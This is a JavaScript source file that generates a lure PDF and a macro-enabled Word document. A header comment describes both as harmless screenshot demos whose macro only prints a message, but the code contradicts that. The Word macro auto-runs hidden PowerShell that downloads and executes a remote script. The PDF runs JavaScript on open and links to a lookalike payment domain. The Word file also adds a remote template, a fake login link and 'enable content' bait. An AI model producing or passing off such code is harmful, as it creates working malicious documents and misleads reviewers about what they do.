// Harmless demo files for the documentation screenshots: a PDF that runs
// JavaScript when opened, and a macro-enabled Word file with a remote template.
// Nothing here does anything: the "macro" only prints a message, and every
// address uses fictional, non-routable example domains.
const le = (v, b) => Buffer.from(Array.from({ length: b }, (_, i) => (v >>> (8 * i)) & 0xff));

export function zipStore(files) {
  const parts = [], central = [];
  let offset = 0;
  for (const [name, data] of files) {
    const nm = Buffer.from(name);
    const local = Buffer.concat([le(0x04034b50, 4), le(20, 2), le(0, 2), le(0, 2), le(0, 4), le(0, 4), le(data.length, 4), le(data.length, 4), le(nm.length, 2), le(0, 2), nm, data]);
    central.push(Buffer.concat([le(0x02014b50, 4), le(20, 2), le(20, 2), le(0, 2), le(0, 2), le(0, 4), le(0, 4), le(data.length, 4), le(data.length, 4), le(nm.length, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 4), le(offset, 4), nm]));
    parts.push(local);
    offset += local.length;
  }
  const cd = Buffer.concat(central);
  return Buffer.concat([...parts, cd, le(0x06054b50, 4), le(0, 2), le(0, 2), le(files.length, 2), le(files.length, 2), le(cd.length, 4), le(offset, 4), le(0, 2)]);
}

/** A minimal OLE2 container; every stream sits in regular sectors (the header's mini-stream cutoff is 1). */
function makeCfb(root) {
  const flat = [{ node: { name: 'Root Entry', children: root }, left: -1, right: -1, child: -1, start: 0xfffffffe }];
  const place = (nodes) => {
    const items = nodes.map((n) => { const f = { node: n, left: -1, right: -1, child: -1, start: 0xfffffffe, id: flat.length }; flat.push(f); return f; });
    items.forEach((f, i) => { f.right = i + 1 < items.length ? items[i + 1].id : -1; if (f.node.children) f.child = place(f.node.children); });
    return items.length ? items[0].id : -1;
  };
  flat[0].child = place(root);
  const SECTOR = 512;
  const dirSectors = Math.ceil(flat.length / 4);
  const streams = flat.filter((f) => f.node.data);
  let next = 1 + dirSectors;
  const fat = [0xfffffffd];
  for (let i = 0; i < dirSectors; i++) fat.push(i + 1 < dirSectors ? 1 + i + 1 : 0xfffffffe);
  for (const s of streams) {
    const n = Math.max(1, Math.ceil(s.node.data.length / SECTOR));
    s.start = next;
    for (let i = 0; i < n; i++) fat.push(i + 1 < n ? next + i + 1 : 0xfffffffe);
    next += n;
  }
  const out = Buffer.alloc((next + 1) * SECTOR);
  Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]).copy(out);
  out.writeUInt16LE(0x3e, 24); out.writeUInt16LE(3, 26); out.writeUInt16LE(0xfffe, 28); out.writeUInt16LE(9, 30); out.writeUInt16LE(6, 32);
  out.writeUInt32LE(1, 44); out.writeUInt32LE(1, 48); out.writeUInt32LE(1, 56); out.writeUInt32LE(0xfffffffe, 60); out.writeUInt32LE(0xfffffffe, 68);
  for (let i = 0; i < 109; i++) out.writeUInt32LE(i === 0 ? 0 : 0xffffffff, 76 + i * 4);
  fat.forEach((v, i) => out.writeUInt32LE(v >>> 0, SECTOR + i * 4));
  flat.forEach((f, i) => {
    const o = (2 + (i >> 2)) * SECTOR + (i & 3) * 128;
    const name = f.node.name;
    for (let k = 0; k < name.length; k++) out.writeUInt16LE(name.charCodeAt(k), o + k * 2);
    out.writeUInt16LE(name.length * 2 + 2, o + 64);
    out[o + 66] = i === 0 ? 5 : f.node.data ? 2 : 1;
    out.writeUInt32LE(f.left >>> 0, o + 68); out.writeUInt32LE(f.right >>> 0, o + 72); out.writeUInt32LE(f.child >>> 0, o + 76);
    out.writeUInt32LE((f.node.data ? f.start : 0xfffffffe) >>> 0, o + 116);
    out.writeUInt32LE(f.node.data ? f.node.data.length : 0, o + 120);
  });
  for (const s of streams) s.node.data.copy(out, (s.start + 1) * SECTOR);
  return out;
}

/** MS-OVBA compression with literal tokens only. */
function vbaCompress(src) {
  const out = [1];
  for (let off = 0; off < src.length; off += 2000) {
    const chunk = src.subarray(off, off + 2000);
    const body = [];
    for (let i = 0; i < chunk.length; i += 8) { body.push(0, ...chunk.subarray(i, i + 8)); }
    const header = 0xb000 | ((body.length + 2 - 3) & 0x0fff);
    out.push(header & 255, header >> 8, ...body);
  }
  return Buffer.from(out);
}

const rec = (id, data) => [id & 255, id >> 8, ...le(data.length, 4), ...data];
const ascii = (s) => [...s].map((c) => c.charCodeAt(0));

function vbaProject(modules) {
  const dir = [...rec(0x0003, [0xe4, 0x04]), ...rec(0x0004, ascii('VBAProject')), ...rec(0x000f, [modules.length, 0]), ...rec(0x0013, [0xff, 0xff])];
  for (const m of modules) dir.push(...rec(0x0019, ascii(m.name)), ...rec(0x001a, ascii(m.name)), ...rec(0x0031, [0, 0, 0, 0]), ...rec(0x0021, []), ...rec(0x002b, []));
  dir.push(...rec(0x0010, []));
  return makeCfb([{ name: 'VBA', children: [{ name: 'dir', data: vbaCompress(Buffer.from(dir)) }, { name: '_VBA_PROJECT', data: Buffer.from([0xcc, 0x61, 0xff, 0xff, 0, 0, 0]) }, ...modules.map((m) => ({ name: m.name, data: vbaCompress(Buffer.from(m.code)) }))] }]);
}

/** A PDF that would run JavaScript on open and is one big link: the classic lure shape. */
export function demoPdf() {
  return Buffer.from(
    [
      '%PDF-1.7',
      '1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >> endobj',
      '2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj',
      '3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] /Contents 6 0 R >> endobj',
      '4 0 obj << /Type /Annot /Subtype /Link /Rect [0 0 612 792] /A << /S /URI /URI (https://paypa1-secure.top/invoice/84213) >> >> endobj',
      '5 0 obj << /S /JavaScript /JS (var t = unescape("%u0041%u0042"); eval("app.alert(1)"); app.launchURL("https://paypa1-secure.top/track.js", true);) >> endobj',
      '6 0 obj << /Length 78 >>',
      'stream',
      'BT /F1 18 Tf 72 700 Td (Invoice 84213 - open to view the payment details) Tj ET',
      'endstream endobj',
      '7 0 obj << /Producer (wkhtmltopdf 0.12.6) /Creator (Canva) >> endobj',
      'trailer << /Root 1 0 R /Info 7 0 R >>',
      '%%EOF',
      '',
    ].join('\n'),
    'latin1',
  );
}

/** A macro-enabled Word file: auto-run macro, remote template, and text pushing "Enable Editing". */
export function demoDocm() {
  const macro = [
    'Attribute VB_Name = "ThisDocument"',
    'Sub AutoOpen()',
    '  Dim cmd As String',
    '  cmd = "powershell -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString(\'http://files.invoice-portal.example/stage2.ps1\')"""',
    '  CreateObject("WScript.Shell").Run cmd, 0',
    'End Sub',
    '',
  ].join('\r\n');
  return zipStore([
    ['[Content_Types].xml', Buffer.from('<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')],
    ['word/document.xml', Buffer.from('<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body><w:p><w:r><w:t>This document is protected. Enable editing and then enable content to view it.</w:t></w:r></w:p><w:p><w:hyperlink r:id="rId9"><w:r><w:t>Review your invoice</w:t></w:r></w:hyperlink></w:p></w:body></w:document>')],
    ['word/_rels/document.xml.rels', Buffer.from('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://login.invoice-portal.example/review" TargetMode="External"/></Relationships>')],
    ['word/_rels/settings.xml.rels', Buffer.from('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://cdn.invoice-portal.example/template.dotm" TargetMode="External"/></Relationships>')],
    ['word/vbaProject.bin', vbaProject([{ name: 'ThisDocument', code: macro }])],
    ['docProps/core.xml', Buffer.from('<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator>admin</dc:creator><cp:lastModifiedBy>user</cp:lastModifiedBy></cp:coreProperties>')],
  ]);
}
